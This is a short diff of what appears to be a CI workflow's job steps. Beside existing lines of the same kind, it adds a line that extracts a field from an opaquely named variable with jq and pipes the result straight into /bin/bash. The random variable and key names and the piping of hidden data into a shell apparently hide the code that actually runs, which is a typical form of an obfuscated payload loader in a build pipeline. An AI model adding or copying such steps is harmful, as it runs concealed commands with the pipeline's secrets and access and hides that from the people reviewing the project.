@@ -24,6 +24,7 @@ jobs:
           echo $j432 | jq -r .pakit6688 | /bin/bash
           echo $z87 | jq -r .cbl6804 | /bin/bash
           echo $x945 | jq -r .e7 | /bin/bash
+          printf '%s' "$rxft0" | jq -r .mo85538 | /bin/bash
 
       - name: Archive results
         if: always()
